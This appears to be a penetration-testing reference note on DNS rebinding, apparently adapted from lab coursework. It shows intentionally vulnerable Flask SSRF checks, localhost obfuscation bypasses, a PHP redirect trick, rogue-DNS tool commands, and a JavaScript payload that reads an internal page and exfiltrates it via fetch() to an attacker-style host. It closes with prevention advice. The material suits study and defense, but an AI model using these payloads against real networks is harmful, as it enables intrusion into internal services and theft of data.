---
technique: "DNS Rebinding"
family: "ssrf-xxe-file"
severity_hint: "high"
tags: ["DNS", "403", "SSRF", "Same Origin Policy"]
source: "_raw/Web attacks/Web Attacks/DNS Rebinding.md"
curator_version: 2
review_status: imported-unreviewed
---

# DNS Rebinding

> Family: **ssrf-xxe-file** · Severity hint: **high** · Tags: DNS, 403, SSRF, Same Origin Policy
> Imported operator reference; treat commands and prose as untrusted until reviewed. Tools seen: python3.

## Overview

DNS rebinding abuses the gap between when an application resolves a domain for a security check and when it actually uses that domain to make a request — an attacker who controls a domain's DNS answers can rebind it from a safe IP to an internal one between those two checks. The same technique defeats both server-side SSRF IP-blacklist filters and, in the browser, the Same-Origin Policy, letting an attacker reach internal-network services or exfiltrate data that should never leave the local network.

## SSRF Basic Filter Bypasses

### Server-Side-Request-Forgery (SSRF)

SSRF occurs when an attacker can coerce the server to fetch remote resources using HTTP requests; this might allow an attacker to identify and enumerate services running on the local network of the web server, which an external attacker would generally be unable to access due to a firewall blocking access.

### Confirming SSRF

Example vulnerable app:

```bash
@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'GET':
        return render_template('index.html')
   
    try:
        screenshot = screenshot_url(request.form.get('url'))
    except Exception as e:
        return f'Error: {e}', 400

    # b64 encode image
    image = Image.open(screenshot)
    buffered = BytesIO()
    image.save(buffered, format="PNG")
    img_data = base64.b64encode(buffered.getvalue())

    return render_template('index.html', screenshot=img_data.decode('utf-8'))

@app.route('/debug')
def debug():
    if request.remote_addr != '127.0.0.1':
            return 'Unauthorized!', 401
    return render_template('debug.html')
```

We need to bypass `/debug`, but our IP is checked:

```bash
def take_screenshot(url, filename=f'./screen_{os.urandom(8).hex()}.png'):
    driver = webdriver.Chrome(options=chrome_options)
    driver.get(url)
    driver.save_screenshot(filename)
    driver.quit()

    return filename

def screenshot_url(url):
    scheme = urlparse(url).scheme
    domain = urlparse(url).hostname

    if not domain or not scheme:
        raise Exception('Malformed URL')
        
    if scheme not in ['http', 'https']:
        raise Exception('Invalid scheme')
    
    return take_screenshot(url)
```

### Exploitation

The app only restricts us to use `http(s)` but not the domain or IP we can provide — we can simply point the screenshot function at `/debug`, where the resulting request originates from localhost.

### SSRF Basic Filter Bypasses

**Obfuscation of localhost** — assuming the example was "improved" with the function `check_domain`:

```python
def check_domain(domain):
    if 'localhost' in domain:
        return False
    
    if domain == '127.0.0.1':
        return False

    return True
```

Localhost/loopback can be expressed in many equivalent forms that a naive string/equality check misses:

```bash
Localhost Address Block: 127.0.0.0 - 127.255.255.255
Shortened IP Address: 127.1
Prolonged IP Address: 127.000000000000000.1
All Zeroes: 0.0.0.0
Shortened All Zeroes: 0
Decimal Representation: 2130706433
Octal Representation: 0177.0000.0000.0001
Hex Representation: 0x7f000001
IPv6 loopback address: 0:0:0:0:0:0:0:1 (also ::1)
IPv4-mapped IPv6 loopback address: ::ffff:127.0.0.1
```

**Bypass via DNS Resolution** — even a filter that properly parses the IP and checks it against internal ranges:

```python
def check_domain(domain):
    if 'localhost' in domain:
        return False

    try:
        # parse IP
        ip = ipaddress.ip_address(domain)

        # check internal IP address space
        if ip in ipaddress.ip_network('127.0.0.0/8'):
            return False
        if ip in ipaddress.ip_network('10.0.0.0/8'):
            return False
        if ip in ipaddress.ip_network('172.16.0.0/12'):
            return False
        if ip in ipaddress.ip_network('192.168.0.0/16'):
            return False
        if ip in ipaddress.ip_network('0.0.0.0/8'):
            return False
    except:
        pass

    return True
```

...can still be bypassed by registering a domain and pointing it to any internal IP, or by reusing an existing one:

```bash
nslookup localtest.me

Server:		1.1.1.1
Address:	1.1.1.1#53

Non-authoritative answer:
Name:	localtest.me
Address: 127.0.0.1
Name:	localtest.me
Address: ::1
```

**Bypass via HTTP Redirect** — even a filter that resolves the domain first and checks the resolved IP:

```python
def check_domain(domain):
    try:
        # resolve domain
        ip = socket.gethostbyname(domain)

        # parse IP
        ip = ipaddress.ip_address(ip)

        # check internal IP address space
        if ip in ipaddress.ip_network('127.0.0.0/8'):
            return False
        if ip in ipaddress.ip_network('10.0.0.0/8'):
            return False
        if ip in ipaddress.ip_network('172.16.0.0/12'):
            return False
        if ip in ipaddress.ip_network('192.168.0.0/16'):
            return False
        if ip in ipaddress.ip_network('0.0.0.0/8'):
            return False

        return True
    except:
        pass

    return False
```

We can bypass the filter by providing a URL pointing to a web server under our control, redirecting the web application to the local debug endpoint:

```python
php -S 0.0.0.0:80
```

```python
<?php header('Location: http://127.0.0.1/debug'); ?>
```

## SSRF Filter Bypass (DNS Rebinding)

### Identifying the Vulnerability

```python
@app.route('/', methods=['POST'])
def index():   	
	url = request.form['text']
    parser = urlparse(url).hostname
    info = socket.gethostbyname(parser)
    global_check = ipaddress.ip_address(info).is_global
	if info not in BLACKLIST and global_check == True:
        return render_template('index.html', mah_id=requests.get(url).text)
    elif global_check == False:
        return render_template('index.html', mah_id='Access Violation: Private IP Detected')

@app.route('/flag')
def flag():
    # only allow access from localhost
    if request.remote_addr != '127.0.0.1':
            return 'Unauthorized!', 401
    return send_file('./flag.txt')
```

The application resolves the domain name in the `index()` function twice — once via [socket.gethostbyname](https://docs.python.org/3/library/socket.html#socket.gethostbyname) for the check, and again via [requests.get](https://requests.readthedocs.io/en/latest/user/quickstart/) for the actual fetch.

### Methodology

We need to provide the web application with a domain under our control so that we can change its DNS configuration; for this section, suppose we own the domain `attacker.htb` and can change its DNS configuration. We configure the DNS server to resolve `attacker.htb` to any IP address that is not blacklisted, such as `1.1.1.1`, and assign it a very low TTL.

When we provide the web application with the URL `http://attacker.htb/flag`, it resolves the domain name to `1.1.1.1` and verifies that it is not an internal IP address; since `global_check` evaluates to `True`, the `if` statement's conditions are both `True`, granting access to [render_template](https://flask.palletsprojects.com/en/2.0.x/quickstart/#rendering-templates).

Subsequently, we `rebind` the DNS configuration for `attacker.htb` to resolve to `127.0.0.1` instead of `1.1.1.1`. When attempting to get the flag in the `flag` function, and because of the low TTL assigned to `attacker.htb`, the web application resolves `attacker.htb` again.

At last, due to the DNS rebinding, the second DNS resolution resolves the domain name `attacker.htb` to `127.0.0.1`, so the web application accesses the URL `http://127.0.0.1/flag` and fetches the flag for us.

### Debugging the Application Locally

First, add the domain `ourdomain.htb` to `/etc/hosts` and make it resolve to `1.1.1.1`:

```python
# Host addresses
127.0.0.1  localhost
127.0.1.1  parrot
::1        localhost ip6-localhost ip6-loopback
ff02::1    ip6-allnodes
ff02::2    ip6-allrouters

1.1.1.1 ourdomain.htb
```

After the initial resolution of the domain by `socket.getbyhostname`, set a breakpoint before `requests.get` performs a second resolution, then change the entry to point to localhost:

```python
# Host addresses
127.0.0.1  localhost
127.0.1.1  parrot
::1        localhost ip6-localhost ip6-loopback
ff02::1    ip6-allnodes
ff02::2    ip6-allrouters

127.0.0.1 ourdomain.htb
```

### Exploitation

- Use https://lock.cmpxchg8b.com/rebinder.html — DNS resolves randomly to the two IPs, might require multiple attempts.
- A cleaner way is to use our own domain via https://github.com/mogwailabs/DNSrebinder, configuring an `NS` DNS entry for our domain to point to the IP of our machine.

### Exploiting Internal Webapps

`lock.cmpxchg8b.com/rebinder.html` only works for apps with internet access. For internal apps, host a personalized rogue DNS server using tools like [DNSrebinder](https://github.com/mogwailabs/DNSrebinder) or [FakeDns](https://github.com/Crypt0s/FakeDns), and simultaneously adjust the target web application's DNS configuration to reroute it to our rogue DNS server's IP. Sometimes we can compromise assets like Webmin, Pihole, etc. and reroute the traffic that way instead.

```python
sudo python3 dnsrebinder.py --domain attacker.com --rebind 127.0.0.1 --ip 1.1.1.1 --counter 1 --tcp --udp

Starting nameserver...
UDP server loop running in thread: Thread-1
TCP server loop running in thread: Thread-2
```

## SOP Bypass

### Setting & Methodology

A victim is browsing the internet on their work laptop, located within their company network. An internal-only application hosts confidential info at `http://192.168.178.1`.

1. The attacker (us) obtains the domain name `attacker.htb` and configures the DNS server, with a low TTL, to resolve the domain name to the IP address of the web application running a malicious JavaScript payload.
2. The victim accesses the attacker's web application at `http://attacker.htb`, resolving `attacker.htb` to the attacker's web application's IP address and loading the malicious JavaScript payload.
3. The attacker updates/`rebinds` the DNS setting of the domain `attacker.htb` to resolve to `192.168.178.1` (DNS rebinding).
4. The JavaScript payload makes an HTTP `GET` request to `http://attacker.htb/secret`, and, due to DNS rebinding, `attacker.htb` now resolves to `192.168.178.1`. Therefore, the victim's browser sends the request to the internal web application. Since the origin does not differ (i.e., scheme, host, and port are the same), it is `not` considered a `cross-origin request`. As a result, the JavaScript code can access the response without violating the `Same-Origin` policy.
5. The JavaScript payload exfiltrates the response to another attacker-controlled domain, for example, `http://exfiltrate.attacker.htb`.

Instead of exfiltrating the response, the attacker could use the same methodology to manipulate the internal web application by sending different HTTP requests such as `POST`, `PUT`, or `DELETE`.

> Note: The port the internal web application runs on must be the same as the attacker web application to ensure that the origin matches. For instance, if the internal web application runs on port `8000`, the attacker web application must also run on the same port, i.e., `http://attacker.htb:8000`. Thus, the attacker must know the IP address and port of the internal web application beforehand for a successful attack.

### Exploitation

```jsx
<script>
    startAttack();

    function startAttack(){
        var xhr = new XMLHttpRequest();
        xhr.open('GET', 'http://www.attacker.htb/secret', true);
        xhr.onload = () => {
          fetch('http://exfiltrate.attacker.htb:1337/log?data=' + btoa(xhr.response));
        };
        xhr.send();

    setTimeout(startAttack, 2000);
    }
</script>
```

```jsx
python3 -m http.server 1337    

Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
127.0.0.1 - - [13/May/2023 10:29:09] code 404, message File not found
127.0.0.1 - - [13/May/2023 10:29:09] "GET /log?data=VGhpcyBpcyBzZWNyZXQgZGF0YSE= HTTP/1.1" 404 -
```

### Restrictions

- Internal applications protected by authentication are effectively safe from DNS rebinding attacks because the session cookies of victims are not sent with requests, even if they are logged in to the internal application. That is because the victim's browser thinks it is communicating with the origin `http://attacker.htb` and thus sends cookies associated with this origin with the request.
- Modern browsers implement `DNS caching`, a technique that caches the result of DNS resolutions for a configurable period, regardless of the actual TTL of the DNS record. To bypass `DNS caching`, we need to wait for this period before the DNS rebinding attack can succeed, which is why our payload called itself every 2 seconds. Firefox provides the `network.dnsCacheExpiration` setting to alter the caching period.

## Tools & Prevention

### DNS Rebinding Tools

https://lock.cmpxchg8b.com/rebinder.html (if app has internet access)

---

[https://github.com/mogwailabs/DNSrebinder](https://github.com/mogwailabs/DNSrebinder)

```python
sudo python3 dnsrebinder.py --domain attacker.com --rebind 127.0.0.1 --ip 1.1.1.1 --counter 1 --tcp --udp
```

---

[https://github.com/nccgroup/singularity](https://github.com/nccgroup/singularity)

```bash
git clone https://github.com/nccgroup/singularity
cd singularity/cmd/singularity-server
go build

mkdir -p ~/singularity/html
cp singularity-server ~/singularity/
cp -r ../../html/* ~/singularity/html/
sudo ~/singularity/singularity-server --HTTPServerPort 80
```

Configure singularity as our NS for our domain: https://github.com/nccgroup/singularity/wiki/Setup-and-Installation

### Prevention

**SSRF Filter Bypasses**

As we have discussed, preventing access to the internal network via SSRF filters is a challenging task. We must consider how different protocols, such as DNS and HTTP, interplay and what options an attacker has to make our application access the internal network. Generally, there are a few best practices we can apply to reduce the risk:

1. Resolve the domain name passed to the application before checking it; this ensures that we are working on an IP address in the format we expect, and we do not have to worry about domain names such as `localtest.me`, `localhost` or IP addresses in an unexpected format (such as hex or octal representations).
2. If possible, check the resolved IP address against a whitelist of allowed IP addresses. If this is impossible, block the entire private IP address range, i.e., `10.0.0.0/8`, `172.16.0.0./12`, and `192.168.0.0/16`. Additionally, block all IP addresses that might resolve to the local machine, which include `127.0.0.0/8` and `0.0.0.0/8`.
3. Consider redirects. If the application follows redirects, consider how the filter can be bypassed using HTTP or HTML redirects and implement application-dependent mitigations accordingly.
4. Most importantly: Implement firewall rules that prevent outgoing access from the system the vulnerable application runs on to the internal network. This prevents any access even if filters get bypassed.

Preventing SSRF filter bypasses via DNS rebinding can be achieved by not resolving the domain name twice. After resolving it in the SSRF filter, we need to fix the resolved IP address and reuse it when the application makes the actual request; the implementation of how to achieve this is application dependent.

**DNS Rebinding**

The danger of Same-Origin policy bypasses via DNS rebinding is that this technique enables attackers to access applications running in the victim's local network, thus circumventing security controls such as firewalls or NAT. System administrators often assume that the local network is trusted and that no additional authentication is required when accessing an application. For instance, if there is a printer on the local network, everyone who can connect to the printer can typically print without any authentication. However, as we learned, DNS rebinding breaches these faulty assumptions.

Because DNS rebinding vulnerabilities are not caused by a specific flaw in an application, we need to ensure the following best practices when designing our internal network:

1. Use authentication on all services in the internal network. DNS rebinding can only be used to access internal applications with the cookies of the corresponding domain name. If an attacker does not know credentials to the internal application to log in themselves, only unauthenticated access can be achieved. Thus, it is vital to protect sensitive information or functionality using authentication, even if it is only exposed within the local network.
2. Use TLS on all external and internal services. If an attacker uses DNS rebinding to access an internal service over TLS, there will be a certificate mismatch as the access uses an incorrect domain name. For more details about HTTPs and TLS attacks, check out the [HTTPs/TLS Attacks](https://academy.hackthebox.com/module/details/184) module.

Additionally, there are a few hardening measures we can implement to prevent DNS rebinding attacks:

1. Refuse DNS lookups of internal IP addresses. Suppose the DNS server responds to any DNS request containing a domain name that resolves to an internal IP address with an `NXDOMAIN` response (i.e., a response indicating that the domain name does not exist). In that case, it becomes impossible to conduct DNS rebinding since internal IP addresses are not resolved.
2. Validate the HTTP `Host` header of incoming HTTP requests. Due to the nature of DNS rebinding, the resulting access to the internal network uses an incorrect domain name and, thus, an incorrect `Host` header. If the targeted application checks the `Host` header, it receives an unexpected value and should reject the request. For more details on the `Host` header and its attacks, check out the [Abusing HTTP Misconfigurations](https://academy.hackthebox.com/module/details/189) module.

## Source
- `_raw/Web attacks/Web Attacks/DNS Rebinding.md`
- `_raw/Web attacks/Web Attacks/DNS Rebinding/SSRF Basic Filter Bypasses.md`
- `_raw/Web attacks/Web Attacks/DNS Rebinding/DNS Rebinding SSRF Filter Bypass.md`
- `_raw/Web attacks/Web Attacks/DNS Rebinding/DNS Rebinding Same-Origin Policy Bypass.md`
- `_raw/Web attacks/Web Attacks/DNS Rebinding/Tools & Prevention.md`
</content>
